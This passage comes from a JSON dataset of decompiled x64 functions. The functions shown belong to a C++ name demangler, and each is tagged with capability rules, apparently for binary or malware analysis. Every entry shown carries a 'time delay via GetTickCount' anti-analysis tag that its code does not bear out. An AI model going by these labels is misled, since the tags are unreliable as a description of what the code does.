*(arg1 + 0x13c);\n        if (-1 < iVar14) {\n            do {\n                if (*puVar24 != 0x2f) break;\n                if (iVar14 == 0) {\n                    puVar24 = *(puVar24 + 4);\n                    if (puVar24 != NULL) {\n                        uVar29 = *puVar24;\n                        goto code_r0x000140008591;\n                    }\n                    break;\n                }\n                puVar24 = *(puVar24 + 6);\n                iVar14 = iVar14 + -1;\n            } while (puVar24 != NULL);\n            if (uVar38 == 0) goto code_r0x000140008400;\n            goto code_r0x00014000b062;\n        }\n        uStack200 = *(arg1 + 0x128);\n        if (uVar39 != 0x2f) goto code_r0x0001400085b3;\n    }\n    else {\ncode_r0x000140008591:\n        uStack200 = *(arg1 + 0x128);\n        if ((uVar29 != 0x23) && (uVar39 != uVar29)) {\n            if (uVar29 != 0x24) goto code_r0x0001400085b3;\n            puVar37 = *(puVar24 + 4);\n            *(arg1 + 0x128) = &stack0xffffffffffffff38;\n            uStack176 = *(arg1 + 0x120);\n            uStack192 = arg3;\n            if (puVar37 != NULL) goto code_r0x0001400084c8;\ncode_r0x0001400084bf:\n            puVar37 = *(arg3 + 4);\n            uStack192 = arg3;\n            goto code_r0x0001400084c8;\n        }\n    }\n    puVar37 = *(puVar24 + 4);\n    arg3 = puVar24;\ncode_r0x0001400085b3:\n    *(arg1 + 0x128) = &stack0xffffffffffffff38;\n    uStack176 = *(arg1 + 0x120);\n    uStack192 = arg3;\ncode_r0x0001400084c8:\n    puVar24 = uStack192;\n    aiStack184[0] = 0;\n    uStack256 = 0x1400084d5;\n    fcn.14000b4c0(arg1, 0x11, puVar37);\n    if (aiStack184[0] == 0) {\n        uStack256 = 0x14000a54e;\n        fcn.14000b560(arg1, 0x11, puVar24);\n    }\n    *(arg1 + 0x128) = uStack200;\n    if (uVar38 == 0) {\n        return;\n    }\n    *(arg1 + 0x120) = unaff_RDI;\n    return;\n}\n",
        "token_count": 29789
    },
    "140004e8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t * fcn.140004e80(int64_t arg1, int32_t *arg2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    if (arg2 == NULL) {\n        return NULL;\n    }\n    do {\n    // switch table (9 cases) at 0x1400ff090\n        switch(*arg2) {\n        case 0:\n        case 6:\n            return NULL;\n        case 5:\n            if (*(arg1 + 0x120) == 0) {\n                *(arg1 + 0x130) = 1;\n                return NULL;\n            }\n            iVar3 = arg2[4];\n            piVar1 = *(*(*(arg1 + 0x120) + 8) + 0x18);\n            if (-1 < iVar3) {\n                if (piVar1 == NULL) {\n                    return NULL;\n                }\n                while( true ) {\n                    if (*piVar1 != 0x2f) {\n                        return NULL;\n                    }\n                    if (iVar3 == 0) break;\n                    piVar1 = *(piVar1 + 6);\n                    iVar3 = iVar3 + -1;\n                    if (piVar1 == NULL) {\n                        return NULL;\n                    }\n                }\n                piVar1 = *(piVar1 + 4);\n            }\n            if (piVar1 == NULL) {\n                return NULL;\n            }\n            if (*piVar1 != 0x2f) {\n                return NULL;\n            }\n            return piVar1;\n        default:\n            uVar2 = *arg2 - 0x18;\n            if (uVar2 < 0x36) {\n                if ((1 << (uVar2 & 0x3f) & 0x338c0004108001U) != 0) {\n                    return NULL;\n                }\n                if (uVar2 == 0x1b) goto code_r0x000140004ee9;\n            }\n        case 1:\n        case 2:\n        case 3:\n        case 4:\n            piVar1 = fcn.140004e80(arg1, *(arg2 + 4));\n            if (piVar1 != NULL) {\n                return piVar1;\n            }\n        case 7:\n        case 8:\ncode_r0x000140004ee9:\n            arg2 = *(arg2 + 6);\n            if (arg2 == NULL) {\n                return NULL;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 552
    },
    "140005fc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001400047b0)\n// WARNING: Removing unreachable block (ram,0x000140004751)\n// WARNING: Removing unreachable block (ram,0x000140004800)\n// WARNING: Removing unreachable block (ram,0x000140004813)\n// WARNING: Removing unreachable block (ram,0x0001400047b8)\n// WARNING: Removing unreachable block (ram,0x0001400047c7)\n// WARNING: Removing unreachable block (ram,0x00014000481f)\n// WARNING: Removing unreachable block (ram,0x000140004824)\n// WARNING: Removing unreachable block (ram,0x00014000482d)\n// WARNING: Removing unreachable block (ram,0x0001400047ce)\n// WARNING: Removing unreachable block (ram,0x00014000476e)\n// WARNING: Removing unreachable block (ram,0x000140004773)\n// WARNING: Removing unreachable block (ram,0x000140004778)\n// WARNING: Removing unreachable block (ram,0x000140004782)\n// WARNING: Removing unreachable block (ram,0x0001400047d5)\n// WARNING: Removing unreachable block (ram,0x0001400047d7)\n\nulong fcn.140005fc0(int64_t arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    \n    if (**(arg1 + 0x18) == 'J') {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    }\n    else if (arg2 == 0) {\n        iVar2 = fcn.140005ee0(arg1);\n        goto joined_r0x000140005ff4;\n    }\n    iVar2 = fcn.140005410(arg1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = fcn.140005ee0(arg1);\njoined_r0x000140005ff4:\n    if (iVar2 == 0) {\n        return 0;\n    }\n    // WARNING: Could not recover jumptable at 0x0001400047f6. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (*(*0x1400fef20 + 0x1400fef20))();\n    return uVar1;\n}\n",
        "token_count": 523
    },
    "14000749": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014000476e)\n// WARNING: Removing unreachable block (ram,0x0001400047b0)\n// WARNING: Removing unreachable block (ram,0x000140004751)\n// WARNING: Removing unreachable block (ram,0x000140004800)\n// WARNING: Removing unreachable block (ram,0x000140004813)\n// WARNING: Removing unreachable block (ram,0x0001400047b8)\n// WARNING: Removing unreachable block (ram,0x0001400047c7)\n// WARNING: Removing unreachable block (ram,0x00014000481f)\n// WARNING: Removing unreachable block (ram,0x0001400047ce)\n// WARNING: Removing unreachable block (ram,0x000140004824)\n// WARNING: Removing unreachable block (ram,0x00014000482d)\n// WARNING: Removing unreachable block (ram,0x000140004773)\n// WARNING: Removing unreachable block (ram,0x000140004778)\n// WARNING: Removing unreachable block (ram,0x000140004782)\n// WARNING: Removing unreachable block (ram,0x0001400047d5)\n// WARNING: Removing unreachable block (ram,0x0001400047d7)\n\nulong fcn.140007490(int64_t arg1, ulong arg2)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t aiStack48 [2];\n    \n    aiStack48[0] = 0;\n    piVar4 = aiStack48;\n    if (**(arg1 + 0x18) == arg2) {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    // WARNING: Could not recover jumptable at 0x0001400047f6. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (*(*0x1400fef34 + 0x1400fef20))();\n        return uVar2;\n    }\n    while( true ) {\n        uVar1 = *(arg1 + 0x4c);\n        *(arg1 + 0x4c) = 1;\n        iVar3 = fcn.140006cb0(arg1);\n        *(arg1 + 0x4c) = uVar1;\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.140004740(arg1, 0x2e, iVar3, 0);\n        *piVar4 = iVar3;\n        if (iVar3 == 0) break;\n        piVar4 = iVar3 + 0x18;\n        if (**(arg1 + 0x18) == arg2) {\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            return aiStack48[0];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 656
    },
    "14000b56": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14000b560(uchar *arg1, ulong noname_1, int32_t *arg3)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uchar *puVar7;\n    char *pcVar8;\n    ulong uVar9;\n    \n    if (0x4e < *arg3 - 3U) goto code_r0x00014000b593;\n    // switch table (79 cases) at 0x1400ff8c0\n    switch(*((*arg3 - 3U) * 4 + 0x1400ff8c0) + 0x1400ff8c0) {\n    case 0x14000b5b0:\n        pcVar8 = \" restrict\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        break;\n    case 0x14000b628:\n        pcVar8 = \" volatile\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        break;\n    case 0x14000b6a0:\n        pcVar8 = \" const\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        break;\n    case 0x14000b718:\n        pcVar8 = \" throw\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\ncode_r0x00014000bbd8:\n        iVar5 = *(arg3 + 6);\n        if (iVar5 != 0) {\n            if (iVar4 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar5 = *(arg3 + 6);\n                iVar4 = 0;\n                iVar6 = 1;\n            }\n            else {\n                iVar6 = iVar4 + 1;\n            }\n            *(arg1 + 0x100) = iVar6;\n            arg1[iVar4] = 0x28;\n            arg1[0x108] = 0x28;\ncode_r0x00014000bc14:\n            fcn.14000b4c0(arg1, 0x11, iVar5);\n            iVar5 = *(arg1 + 0x100);\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = 0x29;\n            arg1[0x108] = 0x29;\n            return;\n        }\n        break;\n    case 0x14000b790:\n        iVar4 = *(arg1 + 0x100);\n        if (iVar4 != 0xff) {\n            iVar5 = iVar4 + 1;\n            *(arg1 + 0x100) = iVar5;\n            arg1[iVar4] = 0x20;\n            arg1[0x108] = 0x20;\n            goto code_r0x00014000b83f;\n        }\n        arg1[0xff] = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *arg1 = 0x20;\n        iVar5 = 1;\n        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\ncode_r0x00014000b84b:\n        iVar4 = iVar5 + 1;\n        goto code_r0x00014000b84f;\n    case 0x14000b7c0:\n        iVar4 = *(arg1 + 0x100);\n        if (iVar4 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar5 = 1;\n            iVar4 = 0;\n        }\n        else {\n            iVar5 = iVar4 + 1;\n        }\n        *(arg1 + 0x100) = iVar5;\n        arg1[iVar4] = 0x20;\n        arg1[0x108] = 0x20;\n        goto code_r0x00014000b877;\n    case 0x14000b7f0:\n        iVar5 = *(arg1 + 0x100);\n        if (iVar5 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar4 = 1;\n            iVar5 = 0;\n        }\n        else {\n            iVar4 = iVar5 + 1;\n        }\n        *(arg1 + 0x100) = iVar4;\n        arg1[iVar5] = 0x20;\n        arg1[0x108] = 0x20;\n        arg3 = *(arg3 + 6);\n        goto code_r0x00014000b593;\n    case 0x14000b828:\n        arg3 = *(arg3 + 4);\n    case 0x14000b4c0:\ncode_r0x00014000b593:\n        if (((arg3 != NULL) && (arg3[1] < 2)) && (iVar3 = *(arg1 + 0x134),  iVar3 < 0x401)) {\n            arg3[1] = arg3[1] + 1;\n            uVar9 = *(arg1 + 0x148);\n            *(arg1 + 0x134) = iVar3 + 1;\n            *(arg1 + 0x148) = &stack0xffffffffffffffd8;\n            fcn.1400083b0(arg1, 0x11, arg3);\n            *(arg1 + 0x148) = uVar9;\n            arg3[1] = arg3[1] + -1;\n            *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n            return;\n        }\n        *(arg1 + 0x130) = 1;\n        return;\n    case 0x14000b838:\n        iVar5 = *(arg1 + 0x100);\ncode_r0x00014000b83f:\n        if (iVar5 != 0xff) goto code_r0x00014000b84b;\n        arg1[0xff] = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n        iVar4 = 1;\n        iVar5 = 0;\ncode_r0x00014000b84f:\n        *(arg1 + 0x100) = iVar4;\n        arg1[iVar5] = 0x26;\n        arg1[0x108] = 0x26;\n        break;\n    case 0x14000b870:\n        iVar5 = *(arg1 + 0x100);\ncode_r0x00014000b877:\n        puVar7 = 0x1400ff896;\n        do {\n            uVar2 = *puVar7;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            puVar7 = puVar7 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = uVar2;\n            arg1[0x108] = uVar2;\n            iVar5 = iVar4;\n        } while (puVar7 != 0x1400ff898);\n        break;\n    case 0x14000b8e8:\n        pcVar8 = \" _Complex\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        break;\n    case 0x14000b960:\n        pcVar8 = \" _Imaginary\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        break;\n    case 0x14000b9d8:\n        if (arg1[0x108] != '(') {\n            iVar5 = *(arg1 + 0x100);\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = 0x20;\n            arg1[0x108] = 0x20;\n        }\n        puVar7 = 0x1400ff8af;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 4));\n        iVar5 = *(arg1 + 0x100);\n        do {\n            uVar2 = *puVar7;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            puVar7 = puVar7 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = uVar2;\n            arg1[0x108] = uVar2;\n            iVar5 = iVar4;\n        } while (puVar7 != 0x1400ff8b2);\n        break;\n    case 0x14000ba70:\n        pcVar8 = \" __vector(\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        iVar5 = *(arg3 + 4);\n        goto code_r0x00014000bc14;\n    case 0x14000bae8:\n        pcVar8 = \" transaction_safe\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        break;\n    case 0x14000bb60:\n        pcVar8 = \" noexcept\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        goto code_r0x00014000bbd8;\n    case 0x14000bc90:\n        iVar5 = *(arg1 + 0x100);\n        if (iVar5 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar4 = 1;\n            iVar5 = 0;\n        }\n        else {\n            iVar4 = iVar5 + 1;\n        }\n        *(arg1 + 0x100) = iVar4;\n        arg1[iVar5] = 0x2a;\n        arg1[0x108] = 0x2a;\n    }\n    return;\n}\n",
        "token_count": 4416
    },
    "14000c7c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.14000c7c0(int64_t arg1, ulong noname_1, int32_t *arg3)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar *puVar5;\n    uchar *puVar6;\n    int32_t *piStack40;\n    ulong uVar7;\n    \n    if (*arg3 == 0x32) {\n        iVar4 = *(*(arg3 + 4) + 0x10);\n        puVar6 = *(*(arg3 + 4) + 8);\n        if (iVar4 != 0) {\n            puVar5 = puVar6 + iVar4;\n            iVar4 = *(arg1 + 0x100);\n            do {\n                uVar1 = *puVar6;\n                if (iVar4 == 0xff) {\n                    *(arg1 + 0xff) = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar3 = 1;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar3 = iVar4 + 1;\n                }\n                puVar6 = puVar6 + 1;\n                *(arg1 + 0x100) = iVar3;\n                *(arg1 + iVar4) = uVar1;\n                *(arg1 + 0x108) = uVar1;\n                iVar4 = iVar3;\n            } while (puVar6 != puVar5);\n        }\n        return;\n    }\n    if (((arg3 != NULL) && (arg3[1] < 2)) && (iVar2 = *(arg1 + 0x134),  iVar2 < 0x401)) {\n        arg3[1] = arg3[1] + 1;\n        uVar7 = *(arg1 + 0x148);\n        *(arg1 + 0x134) = iVar2 + 1;\n        *(arg1 + 0x148) = &piStack40;\n        piStack40 = arg3;\n        fcn.1400083b0(arg1, 0x11, arg3);\n        *(arg1 + 0x148) = uVar7;\n        arg3[1] = arg3[1] + -1;\n        *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n        return;\n    }\n    *(arg1 + 0x130) = 1;\n    return;\n}\n",
        "token_count": 581
    },
    "14000d00": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.14000d000(int64_t arg1, ulong noname_1, int64_t arg3)\n\n{\n    char cVar1;\n    uchar uVar2;\n    uint uVar3;\n    ulong arg3_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar *puVar6;\n    char *pcVar7;\n    int32_t *arg3_01;\n    int32_t *piVar8;\n    \n    pcVar7 = **(*(arg3 + 0x10) + 0x10);\n    if (*pcVar7 != 'f') {\n        return 0;\n    }\n    piVar8 = NULL;\n    arg3_01 = *(*(arg3 + 0x18) + 0x18);\n    arg3_00 = *(*(arg3 + 0x18) + 0x10);\n    if (*arg3_01 == 0x3c) {\n        piVar8 = *(arg3_01 + 6);\n        arg3_01 = *(arg3_01 + 4);\n    }\n    uVar3 = *(arg1 + 0x13c);\n    *(arg1 + 0x13c) = 0xffffffff;\n    cVar1 = pcVar7[1];\n    if (cVar1 == 'l') {\n        pcVar7 = \"(...\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar7;\n            if (iVar5 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar7 = pcVar7 + 1;\n            *(arg1 + 0x100) = iVar4;\n            *(arg1 + iVar5) = cVar1;\n            *(arg1 + 0x108) = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar7 != \"\");\n        fcn.14000c7c0(arg1, 0x11, arg3_00);\n    }\n    else {\n        if ('l' < cVar1) {\n            if (cVar1 == 'r') {\n                iVar5 = *(arg1 + 0x100);\n                if (iVar5 == 0xff) {\n                    *(arg1 + 0xff) = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar4 = 1;\n                    iVar5 = 0;\n                }\n                else {\n                    iVar4 = iVar5 + 1;\n                }\n                *(arg1 + 0x100) = iVar4;\n                *(arg1 + iVar5) = 0x28;\n                pcVar7 = \"...)\";\n                *(arg1 + 0x108) = 0x28;\n                fcn.14000ce50(arg1, 0x11, arg3_01);\n                fcn.14000c7c0(arg1, 0x11, arg3_00);\n                iVar5 = *(arg1 + 0x100);\n                do {\n                    cVar1 = *pcVar7;\n                    if (iVar5 == 0xff) {\n                        *(arg1 + 0xff) = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                        iVar4 = 1;\n                        iVar5 = 0;\n                    }\n                    else {\n                        iVar4 = iVar5 + 1;\n                    }\n                    pcVar7 = pcVar7 + 1;\n                    *(arg1 + 0x100) = iVar4;\n                    *(arg1 + iVar5) = cVar1;\n                    *(arg1 + 0x108) = cVar1;\n                    iVar5 = iVar4;\n                } while (pcVar7 != \"\");\n            }\n            goto code_r0x00014000d179;\n        }\n        if ((cVar1 != 'L') && (cVar1 != 'R')) goto code_r0x00014000d179;\n        iVar5 = *(arg1 + 0x100);\n        if (iVar5 == 0xff) {\n            *(arg1 + 0xff) = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar4 = 1;\n            iVar5 = 0;\n        }\n        else {\n            iVar4 = iVar5 + 1;\n        }\n        *(arg1 + 0x100) = iVar4;\n        *(arg1 + iVar5) = 0x28;\n        puVar6 = 0x1400ff68a;\n        *(arg1 + 0x108) = 0x28;\n        fcn.14000ce50(arg1, 0x11, arg3_01);\n        fcn.14000c7c0(arg1, 0x11, arg3_00);\n        iVar5 = *(arg1 + 0x100);\n        do {\n            uVar2 = *puVar6;\n            if (iVar5 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            puVar6 = puVar6 + 1;\n            *(arg1 + 0x100) = iVar4;\n            *(arg1 + iVar5) = uVar2;\n            *(arg1 + 0x108) = uVar2;\n            iVar5 = iVar4;\n        } while (puVar6 != 0x1400ff68d);\n        fcn.14000c7c0(arg1, 0x11, arg3_00);\n        arg3_01 = piVar8;\n    }\n    fcn.14000ce50(arg1, 0x11, arg3_01);\n    iVar5 = *(arg1 + 0x100);\n    if (iVar5 == 0xff) {\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n        iVar4 = 1;\n        iVar5 = 0;\n    }\n    else {\n        iVar4 = iVar5 + 1;\n    }\n    *(arg1 + 0x100) = iVar4;\n    *(arg1 + iVar5) = 0x29;\n    *(arg1 + 0x108) = 0x29;\ncode_r0x00014000d179:\n    *(arg1 + 0x13c) = uVar3;\n    return 1;\n}\n",
        "token_count": 1693
    },
    "14000d39": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.14000d390(int64_t arg1, ulong noname_1, uint32_t *arg3)\n\n{\n    uint8_t uVar1;\n    char *pcVar2;\n    ulong arg3_00;\n    uchar uVar3;\n    char cVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint32_t *arg3_01;\n    uchar *puVar7;\n    \n    if ((((*arg3 & 0xfffffffd) == 0x38) && (pcVar2 = **(*(arg3 + 4) + 0x10),  *pcVar2 == 'd')) &&\n       ((uVar1 = pcVar2[1],  (uVar1 & 0xdf) == 0x58 || (uVar1 == 0x69)))) {\n        arg3_00 = *(*(arg3 + 6) + 0x10);\n        arg3_01 = *(*(arg3 + 6) + 0x18);\n        iVar5 = *(arg1 + 0x100);\n        if (uVar1 == 0x69) {\n            if (iVar5 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar6 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar6 = iVar5 + 1;\n            }\n            *(arg1 + 0x100) = iVar6;\n            *(arg1 + iVar5) = 0x2e;\n            uVar3 = 0x2e;\n        }\n        else {\n            if (iVar5 == 0xff) {\n                *(arg1 + 0xff) = 